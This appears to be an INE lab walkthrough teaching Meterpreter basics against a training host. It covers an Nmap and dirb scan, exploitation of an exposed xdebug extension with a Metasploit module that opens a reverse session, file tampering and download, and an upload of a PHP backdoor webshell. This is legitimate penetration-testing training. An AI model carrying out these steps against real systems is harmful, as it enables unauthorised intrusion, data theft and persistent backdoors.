# Meterpreter Basics (Lab)

## Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Perform the following tasks to complete the lab:

1. Check the present working directory on remote (exploited) machine.
2. List the files present in present working directory of the remote machine.
3. Check the present working directory on local (attacker) machine.
4. List the files present in present working directory of the local machine.
5. Get the flag value present in /app/flag1 file.
6. Change the flag value present in /app/flag1, so that no one else can get the right flag.
7. Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
8. Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.
9. Delete the .zip file from the directory.
10. Print checksum of file mentioned in the extracted file (Refer to Q8).
11. Check the PATH environment variable on the remote machine.
12. There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
13. Change to tools directory on the local machine.
14. Upload a PHP webshell to app directory of the remote machine.

## Tools

* Nmap
* Metasploit Framework



***

**Step 1:** Open the lab link to access the Kali machine.

<figure><img src="https://assets.ine.com/lab/learningpath/3c82236cc0323e372f3193740900fa1ee679832e2ab8f5b62fcb75ad8a9994cf.jpg" alt=""><figcaption></figcaption></figure>

**Step 2:** Run an Nmap scan against the target.

**Command:**

```
nmap -sS -sV demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/8cc57868d9f84bc0e54c943a9d7964e7a987ac1e55a7cf9a05ef6f62f40a09cc.jpg" alt=""><figcaption></figcaption></figure>

**Step 3:** We will scan the target using dirb tool.

**Command:**

```
dirb http://demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/93171e05cd7dcb55e53dc75c35502e8f967631d7a7be4c484a4e3d7aabcbe19f.jpg" alt=""><figcaption></figcaption></figure>

**Step 4:** We will access phpinfo.php file using curl to find more information about the web server.

**Command:**

```
curl http://demo.ine.local/phpinfo.php
```

<figure><img src="https://assets.ine.com/lab/learningpath/00dedd3b1ae10d78d8ab7fcc9440aeedcacb39478ce04df414f7a25fbabe1d51.jpg" alt=""><figcaption></figcaption></figure>

**Step 5:** The xdebug extension is enabled on target server. We can exploit it using exploit/unix/http/xdebug\_unauth\_exec metasploit module.

**Commands:**

```
msfconsole -q 
use exploit/unix/http/xdebug_unauth_exec
set RHOSTS demo.ine.local
set LHOST <Attacker Kali Machine IP>
exploit
```

<figure><img src="https://assets.ine.com/lab/learningpath/7c5f2130267eed8cfc6de8e71ad21beafaf32bb06e69f8be3a14a104cd0a2b41.jpg" alt=""><figcaption></figcaption></figure>

**Step 6:** Check the present working directory on remote (exploited) machine.

**Command:**

```
pwd
```

<figure><img src="https://assets.ine.com/lab/learningpath/68d779e700b553a1103451302808552888adfec71db11e903ff2afc0c907e9f9.jpg" alt=""><figcaption></figcaption></figure>

**Step 7:** List the files present in present working directory of the remote machine.

**Command:**

```
ls
```

<figure><img src="https://assets.ine.com/lab/learningpath/f8919d1b49d52656234314fd5038566185549f810703877bfb7d252e7190f3b1.jpg" alt=""><figcaption></figcaption></figure>

**Step 8:** Check the present working directory on local (attacker) machine.

**Command:**

```
lpwd
```

<figure><img src="https://assets.ine.com/lab/learningpath/ccdfe32c544f3f5c2d062bf23b4e67c685ac13356c659dde88b6507aa2e61c0e.jpg" alt=""><figcaption></figcaption></figure>

**Step 9:** List the files present in present working directory of the local machine.

**Command:**

```
lls
```

<figure><img src="https://assets.ine.com/lab/learningpath/73cffa07d209f51b448e58edb64765d931857a9722c86681489f184590978c01.jpg" alt=""><figcaption></figcaption></figure>

**Step 10:** Get the flag value present in /app/flag1 file.

**Command:**

```
cat /app/flag1
```

<figure><img src="https://assets.ine.com/lab/learningpath/632e5e839cf4a90620c3e6a7329bf95aa4ff9306abb4d70f6426118b15844c6f.jpg" alt=""><figcaption></figcaption></figure>

**Step 11:** Change the flag value present in /app/flag1, so that no one else can get the right flag.

**Commands:**

```
edit /app/flag1
cat /app/flag1
```

<figure><img src="https://assets.ine.com/lab/learningpath/87f4abc246c46ca9b52b50ccc5a7b9b0e3be0ffb309ef92f1c5bafd84e32f4f1.jpg" alt=""><figcaption></figcaption></figure>

**Step 12:** Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.

**Commands:**

```
cd "Secret Files"
ls
cat .flag2
```

<figure><img src="https://assets.ine.com/lab/learningpath/2e072e9a06f3c57bb763d1fb184e4dec8345ac089577325465a30744bdbb21a4.jpg" alt=""><figcaption></figcaption></figure>

**Step 13:** Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.

**Commands:**

```
cd /app
download flag5.zip
```

<figure><img src="https://assets.ine.com/lab/learningpath/6ed2940ede3d78bf84803bae989dedbefbc7133033a41907b0e54dda14f931ad.jpg" alt=""><figcaption></figcaption></figure>

Open a new Terminal.

**Commands:**

```
ls
unzip flag5.zip
cat list
```

<figure><img src="https://assets.ine.com/lab/learningpath/88720fc35c47b920758b6df33a86d2f9da9a99fc15d6a0eed2972fc13b4af19f.jpg" alt=""><figcaption></figcaption></figure>

**Step 14:** Delete the .zip file from the directory.

**Command:**

```
rm flag5.zip
```

<figure><img src="https://assets.ine.com/lab/learningpath/3bf99269e3cec646d5851d06700387ec53af67d7432313479d167ad3679df5d5.jpg" alt=""><figcaption></figcaption></figure>

**Step 15:** Print checksum of file mentioned in the extracted file (Refer to Q8).

**Command:**

```
checksum md5 /bin/bash
```

<figure><img src="https://assets.ine.com/lab/learningpath/6847bf57de2743f1a247eb0e3bdd76d603142617660a9836e76bb92d3f435507.jpg" alt=""><figcaption></figcaption></figure>

**Step 16:** Check the PATH environment variable on the remote machine.

**Command:**

```
getenv PATH
```

<figure><img src="https://assets.ine.com/lab/learningpath/c4d20b329926e4e457a73177935d30ad567d3180a2235d75d67df9a393f87919.jpg" alt=""><figcaption></figcaption></figure>

**Step 17:** There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.

**Command:**

```
search -d /usr/bin -f *ckdo*
```

<figure><img src="https://assets.ine.com/lab/learningpath/e06798f92efc5ce4889a7408b397afa277e6dacf6d1f3a89f639ac27c2092913.jpg" alt=""><figcaption></figcaption></figure>

**step 18:** Change to tools directory on the local machine.

**Command:**

```
lcd /root/Desktop/tools
```

<figure><img src="https://assets.ine.com/lab/learningpath/b188b1eaf8b820719d29e411bdc6d5c95d2a8b6b7cfa8579463cbdadbb4ef9fb.jpg" alt=""><figcaption></figcaption></figure>

**Step 19:** Upload a PHP webshell to app directory of the remote machine.

**Command:**

```
upload /usr/share/webshells/php/php-backdoor.php
```

<figure><img src="https://assets.ine.com/lab/learningpath/95891a280c2314009a78140e6a92908df2600177065b9738aaa7f0fdd3519bba.jpg" alt=""><figcaption></figcaption></figure>

## Conclusion

In this lab, we learned about the basics of the meterpreter and saw a way to get the shell on the target machine.
